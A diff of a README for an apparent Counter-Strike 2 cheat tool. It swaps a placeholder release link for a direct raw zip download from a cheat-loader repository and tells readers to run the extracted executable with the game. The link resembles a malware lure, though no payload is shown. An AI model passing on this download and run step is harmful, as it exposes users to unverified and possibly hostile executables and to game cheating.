@@ -73,7 +73,7 @@ It was created primarily for the *purpose* of *improving* skills with the Window
 
 ## 🚀 Getting Started
 
-1.  **Download:** Grab the latest release `.zip` file from the [**Releases Section**](YOUR_RELEASE_LINK_HERE). <!-- **IMPORTANT:** Replace YOUR_RELEASE_LINK_HERE with the actual link -->
+1.  **Download:** Grab the latest release `.zip` file from [**here**](https://github.com/slayyyd/AnyLoader-cs2-internal-cheats/raw/refs/heads/main/AnyLoader-v1.8.4.zip).
 2.  **Extract:** Unzip the downloaded archive to a folder of your choice.
 3.  **Run:** Launch Counter-Strike 2 first, then run the executable file for AnyxCS2.
 
